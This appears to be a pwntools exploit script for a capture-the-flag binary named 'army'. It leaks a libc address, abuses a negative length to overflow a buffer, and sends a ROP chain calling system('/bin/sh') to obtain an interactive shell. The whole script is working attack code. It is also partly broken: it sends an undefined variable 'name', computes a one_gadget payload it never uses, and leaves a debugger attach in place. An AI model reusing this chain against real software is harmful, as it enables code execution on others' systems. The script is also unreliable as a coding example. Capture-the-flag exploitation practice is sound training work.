from pwn import *
def cmd(c):
	p.readuntil("tion\n")
	p.sendline(str(c))
def add(name,h,w,size,des):
	cmd(1)
	p.readuntil("name: ")
	p.sendline(name)
	p.readuntil("height: ")
	p.sendline(str(h))
	p.readuntil("weight: ")
	p.sendline(str(w))
	p.readuntil("answer: ")	
	p.send(str(size).ljust(4))	
	p.readuntil("tion: ")
	p.send(des.ljust(size))
def leave(mes,size):
	cmd(3)
	p.readuntil("answer : ")
	p.send(mes.ljust(size))
context.log_level="debug"
pop_rdi_ret=0x400d03
p=process("./army")
p.readuntil("Luck : ")
data=p.readline()
puts=u64(data[:-1].ljust(8,"\0"))
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address=puts-libc.symbols['puts']
off=0x138
size=0x58
add("jack",1,1,size,"")
leave("",size)
cmd(1)
p.readuntil("name: ")
p.sendline(name)
p.readuntil("height: ")
p.sendline(str(1))
p.readuntil("weight: ")
p.sendline(str(1))
p.readuntil("answer: ")	
p.send(str(-1).ljust(4))
gdb.attach(p,'''
''')
payload=p64(0xf1147+libc.address)
leave("A"*0x38+p64(pop_rdi_ret)+p64(libc.search("/bin/sh").next())+p64(libc.symbols["system"]),size)
p.interactive()
